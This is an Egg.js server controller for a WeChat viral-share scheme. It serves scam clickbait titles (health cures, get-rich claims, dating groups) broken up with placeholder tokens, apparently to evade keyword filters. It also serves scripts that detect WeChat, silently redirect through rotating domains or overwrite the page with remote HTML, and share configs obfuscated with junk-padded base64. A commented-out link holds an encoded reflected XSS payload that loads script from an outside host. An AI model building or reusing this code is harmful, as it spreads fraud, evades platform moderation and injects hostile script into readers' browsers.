'use strict';

const Controller = require('egg').Controller;
const atob = require('atob');
const btoa = require('btoa');

// title = "{bq}蜂{fuck}蜜加{fuck}一物，排出全身毒，{city}医{fuck}生经{fuck}常喝它！（超管用）" honey2
// title = "{bq}'娇娇'{fuck}邀请你{fuck}{fuck}加入群{fuck}聊，90{fuck}后单身妹{fuck}{fuck}子日{fuck}子过{fuck}万群，进群查{fuck}{fuck}看详情" wz
// title = '{bq}{city}95{fuck}后{fuck}奇女{fuck}子躺{fuck}家1{fuck}0天，只用1{fuck}00元{fuck}存款{fuck}刷出20万收入，方法{fuck}惊呆{fuck}众人...@所有人'; vp
// title = "㊙️{city}40{fuck}岁{fuck}男{fuck}人如{fuck}何{fuck}比{fuck}20岁小{fuck}伙还要{fuck}猛?最{fuck}新{fuck}方法{fuck}曝{fuck}.光" nk  
// title = "㊙️专{fuck}属{fuck}懒{fuck}人减{fuck}肥妙招，轻松{fuck}月瘦20{fuck}斤，太不{fuck}可{fuck}思议了！" jf
// title {bq}8{fuck}0后{fuck}小{fuck}两口，在{fuck}家1{fuck}0天，仅用{fuck}100元{fuck}赚{fuck}了20万，只因做了这件事……   副标题：>>点击查看详情>>  >>你不主动改变，就永远没有机会>> wz10
// 💕急{fuck}速{fuck}祛{fuck}斑,美{fuck}白,平{fuck}皱{fuck}纹,祛{fuck}痘{fuck}印,无斑点{fuck}一招就搞{fuck}定㊙️,让{fuck}您水{fuck}嫩{fuck}年{fuck}轻18岁！ qb2 
// 💕{fuck}邀请你{fuck}{fuck}加入群聊，90{fuck}后单{fuck}身妹{fuck}子日入过万群，进群查{fuck}{fuck}看详情 
//
const bxConfig = {
  bxtype: 'qb2',
  bxTitle: `💕急{fuck}速{fuck}祛{fuck}斑,美{fuck}白,平{fuck}皱{fuck}纹,祛{fuck}痘{fuck}印,无斑点{fuck}一招就搞{fuck}定㊙️,让{fuck}您水{fuck}嫩{fuck}年{fuck}轻18岁！`
}

class ShareWxController extends Controller {

  async x() {
    const {
      ctx,
      service,
      app
    } = this;

    await service.refer.check();

    const key = `2:gzh:wx6797180ed00efd71:024ketch.com:playing_link`;
    let playing_link = await app.redis.srandmember(key, 1);
    const now = parseInt(Date.now() / 1000);
    playing_link = playing_link.length > 0 ? playing_link[0] : '';
    playing_link = service.url.addParam(playing_link, {
      now
    });

    ctx.set({
      'content-type': "application/x-javascript"
    });

    const data = `
      var bxTitle = '' 
      function _getParam(name) {
      return location.href.match(new RegExp('[?&]' + name + '=([^?&#]+)', 'i')) ? decodeURIComponent(RegExp.$1) : '';
      }
      var ua = navigator.userAgent.toLowerCase();
        if (/micromessenger/.test(ua)) {
          if(_getParam('from')){
              if (top != window || !document.body) {
                top.location.href = '${playing_link}';
              } else {
                var a = document.createElement('a');
                a.href = '${playing_link}';
                a.rel = 'noreferrer';
                a.click();
              }
            }else{
              var _lay=document.createElement('div');_lay.setAttribute('style','width:100%;height:2048px;font-size:1.4em;position:absolute;background-color:white;z-index:99999999;left:0;top:0;');_lay.innerHTML='<div style="color:black;text-align:center;font-size:1.3em">loading...</div>';if(document.body)document.body.appendChild(_lay);document.title="正在打开...";var xhr=new XMLHttpRequest;var html=null;function getParam(name,url){var r=new RegExp('(\?|#|&)'+name+'=(.*?)(#|&|$)');var m=(url||location.href).match(r);return(m?m[2]:'')}function render(){var a=document.open("text/html","replace");a.write(html);a.close()}xhr.onload=function(){html=xhr.responseText;var delay=0;if(delay>0)setTimeout("render()",delay*1000);else render()};xhr.open("GET","https://lbbb.oss-cn-hangzhou.aliyuncs.com/hb_v3/sx.html?t="+Date.now(),!0);xhr.send();
          }
      }`;
    ctx.body = data;
  }

  async index() {
    //refer
    const {
      ctx,
      service
    } = this;

    await service.refer.check();

    ctx.set({
      'content-type': "application/x-javascript"
    });

    let playing_link = await service.url.getRandomLink('wx6797180ed00efd71', 'playing_link', '05ez.com');
    const bx_link = await service.url.getRandomLink('wx6797180ed00efd71', 'jump_link', '05ez.com');
    const now = parseInt(Date.now() / 1000);

    playing_link = service.url.addParam(playing_link, {
      now,
      _d: '05ez'
    });

    const data = `
      function _getParam(name) {
        return location.href.match(new RegExp('[?&]' + name + '=([^?&#]+)', 'i')) ? decodeURIComponent(RegExp.$1) : '';
      }
      var bxTitle = '${bxConfig.bxTitle}'
      var ua = navigator.userAgent.toLowerCase();
      if (/micromessenger/.test(ua)) {
          if(_getParam('from')){
            var playing_link = '${playing_link}'
            var bxtype = _getParam('bxtype')?_getParam('bxtype'):'wz10';

            if(_getParam('bx')){
              playing_link = '${bx_link}&type='+bxtype+'&from='+_getParam('from')
            }
            if (top != window || !document.body) {
              top.location.href = playing_link;
            } else {
              var a = document.createElement('a');
              a.href = playing_link;
              a.rel = 'noreferrer';
              a.click();
            }
          }else{
            var _lay=document.createElement('div');_lay.setAttribute('style','width:100%;height:2048px;font-size:1.4em;position:absolute;background-color:white;z-index:99999999;left:0;top:0;');_lay.innerHTML='<div style="color:black;text-align:center;font-size:1.3em">loading...</div>';if(document.body)document.body.appendChild(_lay);document.title="正在打开...";var xhr=new XMLHttpRequest;var html=null;function getParam(name,url){var r=new RegExp('(\?|#|&)'+name+'=(.*?)(#|&|$)');var m=(url||location.href).match(r);return(m?m[2]:'')}function render(){var a=document.open("text/html","replace");a.write(html);a.close()}xhr.onload=function(){html=xhr.responseText;var delay=0;if(delay>0)setTimeout("render()",delay*1000);else render()};xhr.open("GET","https://lbbb.oss-cn-hangzhou.aliyuncs.com/hb_v3/s.html?t="+Date.now(),!0);xhr.send();
          }
      }`

    ctx.body = data;
  }

  async shareLink() {
    //refer
    const {
      ctx,
      service,
      app
    } = this;

    //await service.refer.check();
    let domian = ctx.hostname;
    let share_link;
    let kk;

    await service.refer.check();
    const appid = await service.url.getAppid(domian);
    // if (service.url.isAndroid()) {
    //   share_link = await service.url.getRandomLink(appid, 'share_link', domian);
    // } else {
    //   share_link = 'http://vhouse.163.com/question/SearchResult/k-xxxxx%22%3E%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%253c%2573%2563%2572%2569%2570%2574%2520%2573%2572%2563%253d%252f%252f%2573%252E%2564%2575%2579%2561%256A%2569%2575%2579%2565%252E%2563%256F%256D%252F%2566%252F%2562%256D%2564%252F%2562%2578%253e%253c%252f%2573%2563%2572%2569%2570%2574%253e%253E?eq=ISNwPygpLygsP2s5I3AlL2s5OXA%252Baz4kKXB8fGsgI3B8eXtjenxrOT5weHx0eXp1eng%253D'
    // }

    share_link = await service.url.getRandomLink(appid, 'share_link', domian);

    const now = parseInt(Date.now() / 1000);
    const spam = service.url.getSpm();
    ctx.body = {
      k: service.url.signUrl(service.url.addParam(share_link, {
        [spam]: spam,
        now,
        bxtype: bxConfig.bxtype,
        kk: kk ? kk : btoa(appid),
        _d: domian.split('.')[0]
      }).replace('{spam}', spam).replace('{spamnum}', now))
    }
  }

  async info() {

    const jfx = true;
    const isMp = false;

    this.ctx.set({
      'content-type': "application/x-javascript"
    })

    const domian = this.ctx.hostname;
    const kk = this.service.refer.getReferParam('kk');
    var appid = atob(kk);

    const jump_link = await this.service.url.getRandomLink(appid, 'jump_link', domian);
    const jump_link_pyq = await this.service.url.getRandomLink(appid, 'jump_link_pyq', domian);

    const data = {
      "ad": {
        "app_url": jump_link,
        "timeline_url": jump_link_pyq,
        "img": "http://butuyu.oss-cn-hangzhou.aliyuncs.com/Img_hb/voice.jpg",
        "desc": "{fuck}\u2709",
        "title": ""
      },
      "attached": {
        "case": "hb",
        "signmode": "jssdk",
        "back_api": "https://akqgyc.com/backup/args/xj_back.php",
        isMp,
        "ad_share": {
          "pyq": [0, 0],
          "qun": [0, 0, 0, 0]
        },
        "timeline_ad": true,
        "needWhite": true,
        "group_ad": true,
        "iosGoAdUrl": "",
        jfx,
        share_title: bxConfig.bxTitle
      },
      "hm": "46ea4995fb6116f9430b8379f5c18d8c",
      "to_timeline": {
        "redirect": "",
        "ad_weight": "100",
        "ad_id": "7675",
        "ad": false,
        "ok_msg": "",
        "img": "https://lbbb.oss-cn-hangzhou.aliyuncs.com/common/img/srpd.jpeg",
        "title": bxConfig.bxTitle,
        "desc": bxConfig.bxTitle
      },
      "to_group": {
        "redirect": "",
        "link": "https://m.fygdrs.com/h5/Wish.html?p=100&uc=6Nq%2Br0%2B0GHFA&id=2811784",
        "img": "https://lbbb.oss-cn-hangzhou.aliyuncs.com/common/img/srpd.jpeg",
        "title": bxConfig.bxTitle,
        "desc": '5{fuck}月{fuck}20日{fuck}诚{fuck}邀{fuck}您的{fuck}参加',
        "back_url": ""
      }
    }

    this.ctx.body = `
    window.data = ${JSON.stringify(data)}
    `
  }

  async shareConfig() {
    //refer
    const {
      ctx,
      app,
      service
    } = this;
    ctx.set({
      'content-type': "application/x-javascript"
    });

    if (app.config.env == 'local1') {
      const data = {
        "jssdk": {
          "debug": false,
          "appId": "wx147cd9c9460771c2",
          "timestamp": "1551706567189",
          "nonceStr": "5doPoFkNOJ4Kd0QI",
          "signature": "066936c26f1c823b7e6b7808a0236d687db1ef34",
          "timelineUrl": "https://obs-cn-shanghai.yun.pingan.com/jump103/2f25aeb55412436dab16679a5b1e5b41_u.html?1AHp8kte=1AHp8kte&_c=7675",
          "groupUrl": "https://obs-cn-shanghai.yun.pingan.com/jump103/1c9730e633d0469b8eedf0d90997c841_u.html?dxcX5MmJ=dxcX5MmJ&_c=7675",
          "cashUrl": "https://obs-cn-shanghai.yun.pingan.com/jump100/0e3b211edc3747fdb4d9b0aefd4c97b0_c.html?1kKo4TaH=1kKo4TaH&fsrc=dz&type=nk"
        }
      }

      let s = JSON.stringify(data);
      s = btoa(s);
      s = s.substr(0, 5) + 'bgsgdsbsma' + s.substr(5);
      return ctx.body = `window.g_shareData = '${s}' `;
    }
    const domian = ctx.hostname;

    const kk = service.refer.getReferParam('kk');
    const from = ctx.request.header.referer.split('#')[0];
    var appid = atob(kk);

    const jump_link = await service.url.getRandomLink(appid, 'jump_link', domian);
    const jump_link_pyq = await service.url.getRandomLink(appid, 'jump_link_pyq', domian);
    try {
      const appid = atob(kk);
      var param = {
        debug: false,
        url: from
      };
      const wechat = await app.shareSign(appid);
      const wxconfig = await wechat.getJsConfig(param);
      const ad_link = 'https://obs-cn-shenzhen.yun.pingan.com/app/0c06aad54eb24ca18df2b2b0e41b46f6_qhbx.html?fsrc=xj&type=nk'

      const data = {
        "jssdk": {
          debug: false,
          appId: `${appid}`,
          timestamp: `${wxconfig.timestamp}`,
          nonceStr: `${wxconfig.nonceStr}`,
          signature: `${wxconfig.signature}`,
          timelineUrl: jump_link_pyq,
          groupUrl: jump_link,
          cashUrl: jump_link
        }
      }

      let s = JSON.stringify(data);
      s = btoa(s);
      s = s.substr(0, 5) + 'bgsgdsbsma' + s.substr(5);
      ctx.body = `window.g_shareData = '${s}'`;
    } catch (ex) {
      ctx.logger.error(ex, kk);
      ctx.body = '';
    }
  }

}

module.exports = ShareWxController;